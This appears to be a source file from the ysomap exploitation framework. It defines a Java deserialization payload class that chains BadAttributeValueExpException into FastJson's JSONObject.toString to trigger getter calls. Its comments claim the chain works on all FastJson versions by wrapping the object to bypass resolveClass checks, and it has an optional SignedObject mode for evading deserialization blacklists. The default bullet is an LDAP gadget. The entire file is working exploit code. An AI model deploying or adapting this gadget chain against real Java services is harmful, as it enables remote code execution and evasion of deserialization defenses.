package ysomap.payloads.java.fastjson;

import com.alibaba.fastjson.JSONObject;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.DetailHelper;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.Objects;

/**
 * @author whocansee
 * @since 2023/10/7
 * BadAttributeValueExpException.readObject->JsonObject.toString->bullet对象的getter方法
 * 原链JsonObject1缺失触发toString的部分，且仅支持FastJson低版本
 * 此链根据Y4tacker师傅的思路实现了Reference包裹绕过高版本后JsonObject重写的readObject方法中的resolveClass检查，从而支持FastJson全版本
 * 由于FastJson序列化逻辑中getter调用顺序的问题，在调用到getDatabaseMetaData()之前就会报错，因而不支持JdbcRowSetImplBullet
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee })
@Targets({Targets.JDK})
@Require(bullets = {"LdapAttributeBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"FastJson all versions."})
@Details("BadAttributeValueExpException.readObject->JsonObject.toString->bullet对象的getter方法" +
        "此链根据Y4tacker师傅的思路实现了Reference包裹绕过高版本后JsonObject重写的readObject方法中的resolveClass检查，从而支持FastJson全版本")

public class BadAttributeValueExpExceptionWithJsonObject extends AbstractPayload<Object> {

    @Require(name = "wrapped", detail = "是否使用SignedObject进行二次反序列化（用以绕过反序列化黑名单）" +
            "默认不使用，填true表示启用")
    private Boolean wrapped = false;

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Object obj1 = getterGadget(obj);
        if (wrapped) {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
            kpg.initialize(1024);
            KeyPair kp = kpg.generateKeyPair();
            SignedObject signedObject = new SignedObject((Serializable) obj1, kp.getPrivate(), Signature.getInstance("DSA"));
            return PayloadHelper.makeReadObjectToStringTrigger(getterGadget(signedObject));
        } else {
            return PayloadHelper.makeReadObjectToStringTrigger(obj1);
        }
    }
    public static Object getterGadget(Object obj) throws Exception {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("gg", obj);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc, jsonObject);
        HashMap hashMap = new HashMap();
        hashMap.put(obj, poc);
        return hashMap;
    }
}